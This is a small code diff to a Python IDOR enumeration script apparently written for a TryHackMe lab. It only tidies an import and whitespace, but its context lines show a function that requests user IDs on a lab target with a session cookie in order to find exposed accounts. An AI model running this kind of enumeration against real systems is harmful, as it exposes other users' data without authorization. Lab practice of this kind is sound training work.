@@ -1,11 +1,11 @@
 import requests
-import sys
 
 # === IDOR Enumeration Tool - TryHackMe AoC 2025 Day 5 Inspired ===
 # Target: http://MACHINE_IP:PORT/ (update below)
 BASE_URL = "http://10.200.100.101:5000/view"  # Change to your target
 PARAM = "user_id"  # or "view_accounts" depending on the app
 SESSION_COOKIE = {"session": "your_session_cookie_here"}  # Grab from browser
+
 
 def check_user(user_id):
     params = {PARAM: user_id}
@@ -19,6 +19,7 @@ def check_user(user_id):
         return length
     except:
         return None
+
 
 if __name__ == "__main__":
     print("[*] Starting IDOR enumeration...")
